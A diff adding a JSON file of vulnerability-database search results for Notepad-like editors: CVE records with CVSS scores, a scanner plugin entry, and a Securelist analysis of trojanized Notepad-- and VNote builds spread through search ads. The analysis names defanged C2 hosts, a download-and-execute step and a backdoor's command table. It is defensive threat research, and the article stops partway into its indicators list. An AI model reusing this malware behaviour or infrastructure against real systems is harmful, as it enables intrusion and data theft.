@@ -1,0 +1,1318 @@
+{
+    "result": "OK",
+    "data": {
+        "search": [
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "OSV:CVE-2023-6401",
+                "_score": 109.919136,
+                "_source": {
+                    "lastseen": "2024-03-13T16:58:08",
+                    "description": "A vulnerability classified as problematic was found in NotePad++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe. The manipulation leads to uncontrolled search path. An attack has to be approached locally. The identifier VDB-246421 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-11-30T15:15:09",
+                    "type": "osv",
+                    "title": "CVE-2023-6401",
+                    "bulletinFamily": "software",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "source": "cna@vuldb.com",
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.3,
+                            "vectorString": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "type": "Secondary",
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-6401"
+                    ],
+                    "modified": "2024-03-02T07:20:54",
+                    "id": "OSV:CVE-2023-6401",
+                    "href": "https://osv.dev/vulnerability/CVE-2023-6401",
+                    "cvss": {
+                        "score": 4.3,
+                        "vector": "AV:L/AC:L/Au:S/C:P/I:P/A:P"
+                    },
+                    "vhref": "https://vulners.com/osv/OSV:CVE-2023-6401"
+                },
+                "highlight": {
+                    "description": [
+                        "A vulnerability classified as problematic was found in <span class=\"vulners-highlight\">NotePad</span>++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus",
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus"
+                    ]
+                },
+                "sort": [
+                    109.919136,
+                    1701357309000
+                ],
+                "flatDescription": "A vulnerability classified as problematic was found in NotePad++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe. The manipulation leads to uncontrolled search path. An attack has to be approached locally. The identifier VDB-246421 was assigned to this..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "CVE-2023-0909",
+                "_score": 106.0998,
+                "_source": {
+                    "lastseen": "2024-03-10T16:35:44",
+                    "description": "A vulnerability, which was classified as problematic, was found in cxasm notepad-- 1.22. This affects an unknown part of the component Directory Comparison Handler. The manipulation leads to denial of service. The attack needs to be approached locally. The associated identifier of this vulnerability is VDB-221475.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "MEDIUM",
+                            "confidentialityImpact": "NONE",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "NONE",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 5.5,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-02-18T09:15:10",
+                    "type": "cve",
+                    "title": "CVE-2023-0909",
+                    "cwe": [
+                        "CWE-404",
+                        "CWE-404"
+                    ],
+                    "bulletinFamily": "NVD",
+                    "cvss2": {
+                        "severity": "LOW",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "source": "cna@vuldb.com",
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "NONE",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "NONE",
+                            "baseScore": 1.7,
+                            "vectorString": "AV:L/AC:L/Au:S/C:N/I:N/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "type": "Secondary",
+                        "impactScore": 2.9,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-0909"
+                    ],
+                    "modified": "2024-02-29T01:37:06",
+                    "cpe": [
+                        "cpe:/a:notepad--_project:notepad--:1.22"
+                    ],
+                    "id": "CVE-2023-0909",
+                    "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-0909",
+                    "cvss": {
+                        "score": 1.7,
+                        "vector": "AV:L/AC:L/Au:S/C:N/I:N/A:P"
+                    },
+                    "cpe23": [
+                        "cpe:2.3:a:notepad--_project:notepad--:1.22:*:*:*:*:*:*:*"
+                    ],
+                    "vhref": "https://vulners.com/cve/CVE-2023-0909"
+                },
+                "highlight": {
+                    "references": [
+                        "https://gitee.com/cxasm/<span class=\"vulners-highlight\">notepad</span>--/issues/I6C80Z"
+                    ],
+                    "description": [
+                        "A vulnerability, which was classified as problematic, was found in cxasm <span class=\"vulners-highlight\">notepad</span>-- 1.22. This affects an unknown part of the component Directory Comparison Handler."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>-- project <span class=\"vulners-highlight\">notepad</span>--"
+                    ],
+                    "affectedSoftware.cpeName": [
+                        "<span class=\"vulners-highlight\">notepad</span>--_project:notepad--"
+                    ],
+                    "product_info.product": [
+                        "<span class=\"vulners-highlight\">notepad</span>--"
+                    ]
+                },
+                "sort": [
+                    106.0998,
+                    1676711710000
+                ],
+                "flatDescription": "A vulnerability, which was classified as problematic, was found in cxasm notepad-- 1.22. This affects an unknown part of the component Directory Comparison Handler. The manipulation leads to denial of service. The attack needs to be approached locally. The associated identifier of this..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "CVE-2023-6401",
+                "_score": 95.232574,
+                "_source": {
+                    "lastseen": "2024-03-06T13:38:01",
+                    "description": "A vulnerability classified as problematic was found in NotePad++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe. The manipulation leads to uncontrolled search path. An attack has to be approached locally. The identifier VDB-246421 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-11-30T15:15:09",
+                    "type": "cve",
+                    "title": "CVE-2023-6401",
+                    "cwe": [
+                        "CWE-427"
+                    ],
+                    "bulletinFamily": "NVD",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "source": "cna@vuldb.com",
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.3,
+                            "vectorString": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "type": "Secondary",
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-6401"
+                    ],
+                    "modified": "2024-02-29T01:42:37",
+                    "cpe": [
+                        "cpe:/a:notepad-plus-plus:notepad\\+\\+:8.1"
+                    ],
+                    "id": "CVE-2023-6401",
+                    "href": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-6401",
+                    "cvss": {
+                        "score": 4.3,
+                        "vector": "AV:L/AC:L/Au:S/C:P/I:P/A:P"
+                    },
+                    "cpe23": [
+                        "cpe:2.3:a:notepad-plus-plus:notepad\\+\\+:8.1:*:*:*:*:*:*:*"
+                    ],
+                    "vhref": "https://vulners.com/cve/CVE-2023-6401"
+                },
+                "highlight": {
+                    "product_info.vendor": [
+                        "<span class=\"vulners-highlight\">Notepad</span>-plus-plus"
+                    ],
+                    "description": [
+                        "A vulnerability classified as problematic was found in <span class=\"vulners-highlight\">NotePad</span>++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus <span class=\"vulners-highlight\">notepad</span>\\+\\+"
+                    ],
+                    "affectedSoftware.cpeName": [
+                        "<span class=\"vulners-highlight\">notepad</span>-plus-plus:notepad\\+\\+"
+                    ],
+                    "product_info.product": [
+                        "<span class=\"vulners-highlight\">Notepad</span>\\+\\+"
+                    ]
+                },
+                "sort": [
+                    95.232574,
+                    1701357309000
+                ],
+                "flatDescription": "A vulnerability classified as problematic was found in NotePad++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe. The manipulation leads to uncontrolled search path. An attack has to be approached locally. The identifier VDB-246421 was assigned to this..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "PRION:CVE-2023-6401",
+                "_score": 87.67497,
+                "_source": {
+                    "lastseen": "2024-03-07T01:09:38",
+                    "description": "A vulnerability classified as problematic was found in NotePad++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe. The manipulation leads to uncontrolled search path. An attack has to be approached locally. The identifier VDB-246421 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "HIGH",
+                            "confidentialityImpact": "HIGH",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "HIGH",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 7.8,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-11-30T15:15:00",
+                    "type": "prion",
+                    "title": "Design/Logic Flaw",
+                    "bulletinFamily": "NVD",
+                    "cvss2": {
+                        "severity": "MEDIUM",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "source": "cna@vuldb.com",
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "PARTIAL",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "PARTIAL",
+                            "baseScore": 4.3,
+                            "vectorString": "AV:L/AC:L/Au:S/C:P/I:P/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "type": "Secondary",
+                        "impactScore": 6.4,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-6401"
+                    ],
+                    "modified": "2024-02-29T01:42:00",
+                    "id": "PRION:CVE-2023-6401",
+                    "href": "https://www.prio-n.com/kb/vulnerability/CVE-2023-6401",
+                    "cvss": {
+                        "score": 4.3,
+                        "vector": "AV:L/AC:L/Au:S/C:P/I:P/A:P"
+                    },
+                    "vhref": "https://vulners.com/prion/PRION:CVE-2023-6401"
+                },
+                "highlight": {
+                    "description": [
+                        "A vulnerability classified as problematic was found in <span class=\"vulners-highlight\">NotePad</span>++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>\\\\+\\\\+"
+                    ]
+                },
+                "sort": [
+                    87.67497,
+                    1701357300000
+                ],
+                "flatDescription": "A vulnerability classified as problematic was found in NotePad++ up to 8.1. Affected by this vulnerability is an unknown functionality of the file dbghelp.exe. The manipulation leads to uncontrolled search path. An attack has to be approached locally. The identifier VDB-246421 was assigned to this..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "PRION:CVE-2023-0909",
+                "_score": 85.6278,
+                "_source": {
+                    "lastseen": "2024-03-10T23:10:16",
+                    "description": "A vulnerability, which was classified as problematic, was found in cxasm notepad-- 1.22. This affects an unknown part of the component Directory Comparison Handler. The manipulation leads to denial of service. The attack needs to be approached locally. The associated identifier of this vulnerability is VDB-221475.",
+                    "cvss3": {
+                        "cvssV3": {
+                            "baseSeverity": "MEDIUM",
+                            "confidentialityImpact": "NONE",
+                            "attackComplexity": "LOW",
+                            "scope": "UNCHANGED",
+                            "attackVector": "LOCAL",
+                            "availabilityImpact": "HIGH",
+                            "integrityImpact": "NONE",
+                            "privilegesRequired": "LOW",
+                            "baseScore": 5.5,
+                            "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+                            "version": "3.1",
+                            "userInteraction": "NONE"
+                        }
+                    },
+                    "published": "2023-02-18T09:15:00",
+                    "type": "prion",
+                    "title": "Design/Logic Flaw",
+                    "bulletinFamily": "NVD",
+                    "cvss2": {
+                        "severity": "LOW",
+                        "exploitabilityScore": 3.1,
+                        "obtainAllPrivilege": false,
+                        "userInteractionRequired": false,
+                        "obtainOtherPrivilege": false,
+                        "source": "cna@vuldb.com",
+                        "cvssV2": {
+                            "accessComplexity": "LOW",
+                            "confidentialityImpact": "NONE",
+                            "availabilityImpact": "PARTIAL",
+                            "integrityImpact": "NONE",
+                            "baseScore": 1.7,
+                            "vectorString": "AV:L/AC:L/Au:S/C:N/I:N/A:P",
+                            "version": "2.0",
+                            "accessVector": "LOCAL",
+                            "authentication": "SINGLE"
+                        },
+                        "type": "Secondary",
+                        "impactScore": 2.9,
+                        "acInsufInfo": false,
+                        "obtainUserPrivilege": false
+                    },
+                    "cvelist": [
+                        "CVE-2023-0909"
+                    ],
+                    "modified": "2024-02-29T01:37:00",
+                    "id": "PRION:CVE-2023-0909",
+                    "href": "https://www.prio-n.com/kb/vulnerability/CVE-2023-0909",
+                    "cvss": {
+                        "score": 1.7,
+                        "vector": "AV:L/AC:L/Au:S/C:N/I:N/A:P"
+                    },
+                    "vhref": "https://vulners.com/prion/PRION:CVE-2023-0909"
+                },
+                "highlight": {
+                    "references": [
+                        "https://gitee.com/cxasm/<span class=\"vulners-highlight\">notepad</span>--/issues/I6C80Z"
+                    ],
+                    "description": [
+                        "A vulnerability, which was classified as problematic, was found in cxasm <span class=\"vulners-highlight\">notepad</span>-- 1.22. This affects an unknown part of the component Directory Comparison Handler."
+                    ],
+                    "affectedSoftware.name": [
+                        "<span class=\"vulners-highlight\">notepad</span>--"
+                    ]
+                },
+                "sort": [
+                    85.6278,
+                    1676711700000
+                ],
+                "flatDescription": "A vulnerability, which was classified as problematic, was found in cxasm notepad-- 1.22. This affects an unknown part of the component Directory Comparison Handler. The manipulation leads to denial of service. The attack needs to be approached locally. The associated identifier of this..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "NOTEPAD_PLUS_PLUS_WIN_INSTALLED.NBIN",
+                "_score": 36.48713,
+                "_source": {
+                    "lastseen": "2024-03-05T17:27:15",
+                    "description": "Notepad++ is installed on the remote Windows host.",
+                    "cvss3": {},
+                    "published": "2023-09-20T00:00:00",
+                    "type": "nessus",
+                    "title": "Notepad++ Installed (Windows)",
+                    "bulletinFamily": "scanner",
+                    "cvss2": {},
+                    "cvelist": [],
+                    "modified": "2024-03-05T00:00:00",
+                    "cpe": [
+                        "cpe:/a:notepad-plus-plus:notepad%5c%2b%5c%2b"
+                    ],
+                    "id": "NOTEPAD_PLUS_PLUS_WIN_INSTALLED.NBIN",
+                    "href": "https://www.tenable.com/plugins/nessus/181646",
+                    "sourceData": "Binary data notepad_plus_plus_win_installed.nbin",
+                    "cvss": {
+                        "score": 0.0,
+                        "vector": "NONE"
+                    },
+                    "vhref": "https://vulners.com/nessus/NOTEPAD_PLUS_PLUS_WIN_INSTALLED.NBIN"
+                },
+                "highlight": {
+                    "references": [
+                        "https://<span class=\"vulners-highlight\">notepad</span>-plus-plus.org/"
+                    ],
+                    "description": [
+                        "<span class=\"vulners-highlight\">Notepad</span>++ is installed on the remote Windows host."
+                    ],
+                    "title": [
+                        "<span class=\"vulners-highlight\">Notepad</span>++ Installed (Windows)"
+                    ]
+                },
+                "sort": [
+                    36.48713,
+                    1695168000000
+                ],
+                "flatDescription": "Notepad++ is installed on the remote Windows host. Binary data..."
+            },
+            {
+                "_index": "es6_bulletins_bulletin_v5",
+                "_type": "_doc",
+                "_id": "SECURELIST:8E6BE65DDA4CA9ECA0CBF89F16A4D473",
+                "_score": 23.381357,
+                "_source": {
+                    "lastseen": "2024-03-13T12:54:26",
+                    "description": "![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/04/26204327/sl_abstract_binary_wave-1200x600-1-990x400.jpg)\n\n&quot;Malvertising&quot; is a popular way of attracting victims to malicious sites: an advertisement block is placed at the top of the search results, increasing the likelihood of users clicking the link. Sites at the top of search results also tend to be more trusted by users. A year ago, our experts [discussed](<https://securelist.com/malvertising-through-search-engines/108996/>) a malvertising campaign that spread the **RedLine** stealer via Google Ads. Using [typosquatting](<https://encyclopedia.kaspersky.com/glossary/typosquatting/?utm_source=securelist&utm_medium=blog&utm_campaign=termin-explanation>) and other techniques, the attackers tried to make their resources look as similar as possible to the official websites of popular programs.\n\nThis time, a similar threat has affected users of one of the most popular search engines in the Chinese internet. We&#x27;ve discovered two related cases where modified versions of popular text editors were distributed in this system: in the first case, the malicious resource appeared in the advertisement section; in the second case, at the top of the search results. We have not yet been able to establish all the details of the threat, so this material may be updated later.\n\n## Malicious sites in search results\n\nThe screenshots below show two searches which the search engine responds to with malicious links:\n\n[![Malicious link in the advertisement section for the search notepad++ \\(left\\) and search results for vnote \\(right\\)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11114834/Trojanized_Notepad_01-1024x352.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11114834/Trojanized_Notepad_01.png>)\n\nMalicious link in the advertisement section for the search notepad++ (left) and search results for vnote (right)\n\nThe malicious site found in the **notepad++** search is distributed through an advertisement block. Opening it, an attentive user will immediately notice an amusing inconsistency: the website address contains the line **vnote**, the title offers a download of **Notepad\u2010\u2010** (an analog of **Notepad++**, also distributed as open-source software), while the image proudly shows **Notepad++**. In fact, the packages downloaded from here contain **Notepad\u2010\u2010**.\n\n[![Page with fake NotePad++](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115044/Trojanized_Notepad_02-1024x518.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115044/Trojanized_Notepad_02.png>)\n\nPage with fake NotePad++\n\nThis site offers installers for three popular platforms (Windows, Linux, macOS); however, there are only two malicious links here, leading to download pages for the macOS and Linux versions. The link to the Windows version leads to the official repository and is not malicious:\n\n[![Application download links, linked to buttons on the malicious Notepad-- download page](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115114/Trojanized_Notepad_03-1024x206.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115114/Trojanized_Notepad_03.png>)\n\nApplication download links, linked to buttons on the malicious Notepad\u2010\u2010 download page\n\nThe screenshot shows that the source of the malicious installation packages is the resource **vnote-1321786806[.]cos[.]ap-hongkong[.]myqcloud[.]com**.\n\nMeanwhile, the second page, found in the **vnote** search, tries to imitate the official website of the program:\n\n[![Fake \\(above\\) and the original \\(below\\) VNote site](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115145/Trojanized_Notepad_04-1008x1024.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115145/Trojanized_Notepad_04.png>)\n\nFake (above) and the original (below) **VNote** site\n\nUnfortunately, at the time of this investigation, the links to the potentially malicious versions of **VNote** were no longer functioning; however, they led to the same resource as the **Notepad\u2010\u2010** links:\n\n[![Application download links, linked to buttons on the fake VNote site](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115215/Trojanized_Notepad_05.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11115215/Trojanized_Notepad_05.png>)\n\nApplication download links, linked to buttons on the fake VNote site\n\n## Text editor with malicious payload\n\nSince we have samples of the fake **Notepad\u2010\u2010 **for Linux and macOS, we can take a closer look at them.\n\nThe downloaded applications have several differences from the original versions, and the malicious Linux and macOS versions are similar in functionality. Next, we will examine the macOS version (_MD5: 00fb77b83b8ab13461ea9dd27073f54f_). It is a disk image in DMG format, whose contents are identical to the original (version 2.0.0), except for the executable file itself, named NotePad\u2010\u2010 (_MD5: 6ace1e014863eee67ab1d2d17a33d146_).\n\nStudying the contents of its **main** function, we discovered that just before the application is launched, the suspicious class **Uplocal** is initialized, which is absent in the source code of the original Notepad\u2010\u2010:\n\n[![Modified section of code before application launch](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120304/Trojanized_Notepad_06.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120304/Trojanized_Notepad_06.png>)\n\nModified section of code before application launch\n\nThis class implements only one method named **run**. Its purpose is to download a file to the path **/tmp/updater** and execute it:\n\n[![Payload of the run method of the Uplocal class](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120342/Trojanized_Notepad_07-1024x430.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120342/Trojanized_Notepad_07.png>)\n\nPayload of the run method of the Uplocal class\n\nThe file is downloaded from the address **hxxp://update[.]transferusee[.]com/onl/mac/&lt;md5_hash&gt;**, where **&lt;md5_hash&gt;** is the MD5 hash of the device&#x27;s serial number obtained in the **GetComputerUUID** function by executing the following bash command:\n    \n    \n    ioreg -rd1 -c IOPlatformExpertDevice |\u00a0 awk '/IOPlatformSerialNumber/ { print $3; }'\n\nThe Linux version differs slightly:\n\n  1. The file is downloaded from the same address, but is located in the directory /onl/lnx/: **hxxp://update[.]transferusee[.]com/onl/lnx/&lt;md5_hash&gt;**\n  2. **&lt;md5_hash&gt;** is the MD5 hash of the device&#x27;s MAC address: \n\n[![Obtaining and hashing the device's MAC address](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120430/Trojanized_Notepad_08.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120430/Trojanized_Notepad_08.png>)\n\nObtaining and hashing the device&#x27;s MAC address\n\nUnfortunately, at the time of our investigation, the downloaded file was no longer available on the server, and we couldn&#x27;t determine what was supposed to be there.\n\nHowever, we know for sure that this server has another subdomain, **dns[.]transferusee[.]com**, and it is accessed by a Mach-O file named **DPysMac64** (_MD5: 43447f4c2499b1ad258371adff4f503f_), previously uploaded to VT and not detected by any vendor at the time of the investigation:\n\n[![DPysMac64 file page on VT](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120532/Trojanized_Notepad_09-1024x663.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120532/Trojanized_Notepad_09.png>)\n\nDPysMac64 file page on VT\n\nMoreover, this file is stored on the same server from which the mysterious **updater** was supposed to be downloaded:\n\n[![Loading DPysMac64 from update\\[.\\]transferusee\\[.\\]com](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120606/Trojanized_Notepad_10-1024x144.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120606/Trojanized_Notepad_10.png>)\n\nLoading DPysMac64 from update[.]transferusee[.]com\n\nFrom this, we can fairly confidently assume that the **updater** is an intermediate step that should ultimately lead to loading **DPysMac64**. The server also contains a file called **DPysMacM1**, the name of which implies that it is built for systems running on Apple Silicon processors; however, in reality, it is the same file as **DPysMac64**.\n\nThe application is a backdoor, very similar to the so-called **Geacon** \u2013 an open-source implementation of the **CobaltStrike** agent written in Go. Although the attackers removed any direct mention of **Geacon** from their project, we found a large number of lines, names, and code fragments of functions and modules matching implementations of [**geacon_plus**](<https://github.com/Z3ratu1/geacon_plus/>), **geacon_pro**, and [**BeaconTool**](<https://github.com/jas502n/BeaconTool>). For example, they have almost completely identical **sysinfo** modules, functions **FirstBlood**, **EncryptedMetaInfo**, **PullCommand**, and so on:\n\n[![Comparison of the list of functions of the sysinfo module of DPysMac64 \\(left\\) and an instance of geacon_pro \\(right\\)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120633/Trojanized_Notepad_11-1024x243.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120633/Trojanized_Notepad_11.png>)\n\nComparison of the list of functions of the **sysinfo** module of DPysMac64 (left) and an instance of geacon_pro (right)\n\nThe backdoor has two launch options \u2013 normal and as a service. Communication with the C2 server **dns[.]transferusee[.]com** is carried out via HTTPS protocol. Interestingly, the attackers named the project which implements the functionality of executing remote commands **spacex**:\n\n[![The name of the backdoor module contained in the lines of the DPysMac64 file](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120705/Trojanized_Notepad_12.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120705/Trojanized_Notepad_12.png>)\n\nThe name of the backdoor module contained in the lines of the DPysMac64 file\n\nThe backdoor contains the following list of commands:\n\n**Code** | **Name** | **Purpose**  \n---|---|---  \n25 | CmdSSH | Creating an SSH connection  \n27 | Spawn | Launching a new agent  \n32 | CmdExit | Shutdown  \n34 | SetSleep | Entering sleep mode  \n1010 | Screenshot | Taking a screenshot  \n1020 | ProcessList | Getting a list of processes  \n1021 | ProcessKill | Terminating a process  \n1030 | PortScan | Scanning ports  \n1031 | Install | Adding itself to the list of services  \n1032 | UnInstall | Removing itself from the list of services  \n1040 | CmdHashdump | Getting the computer name  \n1044 | CmdClipboard | Reading clipboard content  \n1050 | FileBrowse | Getting a list of files in a directory  \n1051 | FileDrives | Getting a list of drives  \n1052 | FileMakeDir | Creating a directory  \n1056 | FileUpload | Uploading a file to the server  \n1057 | FileExecute | Executing a file  \n1060 | FileDownload | Downloading a file from the server  \n  \n## Connection between infected applications\n\nWhile we cannot be certain about the files previously downloaded from **vnote[.]info**, we have discovered that the sources distributing applications on both sites are the same. It&#x27;s also worth mentioning another interesting detail that we found completely by chance during the examination of the modified **NotePad\u2010\u2010**. In the lines of the executable file, we found text resembling an **About** window, but instead of a link to the official project website, it contained a link to the suspicious resource **vnotepad[.]com**. Below is a screenshot of the **About** window in the program&#x27;s user interface:\n\n[![About window of modified Notepad--](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120750/Trojanized_Notepad_13-1024x580.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11120750/Trojanized_Notepad_13.png>)\n\nAbout window of modified Notepad\u2010\u2010\n\nThe link in the **About** window led us to a stub page:\n\n[![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11154800/Trojanized_Notepad_141.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11154800/Trojanized_Notepad_141.png>)\n\nWe found it strange, so we tried to switch from HTTP to HTTPS, which made it possible to discover that this site is another copy of the **VNote** site, similar to the one we saw on **vnote[.]info**. Furthermore, when opening this site, the browser warned us that the certificate it was using was invalid because it was issued for **vnote[.]info**:\n\n[![Certificate used by the site vnotepad\\[.\\]com](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11154934/Trojanized_Notepad_15.png)](<https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/03/11154934/Trojanized_Notepad_15.png>)\n\nCertificate used by the site vnotepad[.]com\n\nThis indicates a definite connection between the two cases described, as well as the high probability that the purpose of the modified **VNote** editors is similar to that of **NotePad\u2010\u2010**, and involves delivering the next stage of infection.\n\n## Conclusion\n\nWe&#x27;re continuing to study the threat described above and are searching for intermediate stages that have not yet been discovered. In addition, we&#x27;ve established that the changes in the Linux and macOS applications are identical, suggesting the possibility of a backdoor for Linux that is similar to the one we found for macOS.\n\n## Indicators of compromise\n\n**Files:**\n\n**MD5** | **File type** | **File name**  \n---|---|---  